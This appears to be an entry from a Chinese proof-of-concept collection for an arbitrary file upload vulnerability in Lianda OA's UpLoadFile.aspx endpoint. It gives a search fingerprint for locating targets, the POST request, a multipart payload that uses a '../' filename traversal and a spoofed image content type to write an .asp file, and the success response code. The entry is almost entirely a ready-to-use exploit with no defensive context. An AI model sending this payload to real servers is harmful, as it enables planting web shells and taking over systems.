# 联达OA-UpLoadFile.aspx任意文件上传漏洞

联达OA-UpLoadFile.aspx ｜ 文件上传 ｜ —
- **指纹**：`app="联达OA"`
- **请求**：`POST /FileManage/UpLoadFile.aspx HTTP/1.1`

**Payload**
```
--00content0boundary00
Content-Disposition: form-data; name="DesignId"
1
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../dudesite.asp"
Content-Type: image/png
dudesite
--00content0boundary00--
```
- **响应特征**：200